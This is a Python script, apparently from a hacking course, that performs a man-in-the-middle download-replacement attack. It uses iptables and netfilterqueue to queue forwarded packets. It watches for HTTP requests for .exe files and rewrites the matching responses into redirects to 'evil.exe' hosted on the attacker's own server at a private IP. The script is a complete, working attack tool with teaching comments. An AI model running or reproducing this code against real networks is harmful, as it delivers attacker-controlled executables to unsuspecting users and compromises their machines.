#!/usr/bin/env python

import netfilterqueue
import subprocess
import scapy.all as scapy

# There are 2 ways to replace downloads. First, by changing the GET request which has .exe field and Host field.
# But, in Request we need a TCP handshake first.
# 2nd way is to get the normal request but to change the response. This way no need of again establishing a TCP handshake.

ack_list = [] # Initialize it once. Acknowledgment no's should be the same for the response as the request.

def subprocess_calls():
    subprocess.call("iptables --flush", shell = True)
    subprocess.call("service apache2 start", shell = True)
    subprocess.call("iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True) # FORWARD chain = Forward packets from the victim to router

def set_load(a_packet, a_load):
    a_packet[scapy.Raw].load = a_load
    del a_packet[scapy.IP].len  # Delete IP and TCP len and chksum
    del a_packet[scapy.IP].chksum
    del a_packet[scapy.TCP].chksum
    return a_packet

def process_packet(packet):

    scapy_packet = scapy.IP(packet.get_payload())  # Give scapy the payload of the packet. Converted the packet to a scapy packet.

    # Modify the scapy packet.
    if scapy_packet.haslayer(scapy.Raw): # Inside Raw layer we have HTTP data. We have IP, TCP, Raw layer etc.

        # Analyzing HTTP packets based on Requests and Responses.
        if scapy_packet[scapy.TCP].dport == 80: # If destination port in tcp layer is 80, the packet is leaving our computer to dest port of 80. So, it's http request.
            if ".exe" in scapy_packet[scapy.Raw].load: # if .exe file in Raw layer and load field.
                print("[+] exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack) # ack in TCP should be same for the response

        elif scapy_packet[scapy.TCP].sport == 80: # Packet is leaving http port.
            if scapy_packet[scapy.TCP].seq in ack_list:  # seq is sequence no in Response TCP which should be same as ack of TCP request.
                ack_list.remove(scapy_packet[scapy.TCP].seq) # Remove that specific packet from the list.
                print("[+] Replacing Files")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://172.16.61.208/evil-files/evil.exe\n\n") # Replaced it with file stored in my server /var/www/html
                packet.set_payload(str(modified_packet)) # Converting scapy_packet back to packet to be send which accepts only str as payload.

    packet.accept() # accept() will simply forward the packet

subprocess_calls()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)  # connect bind queue to queue that we created earlier in comments above. queue no 0 and callback function.
queue.run()

# At the end, service apache2 stop
# At the end, iptables --flush
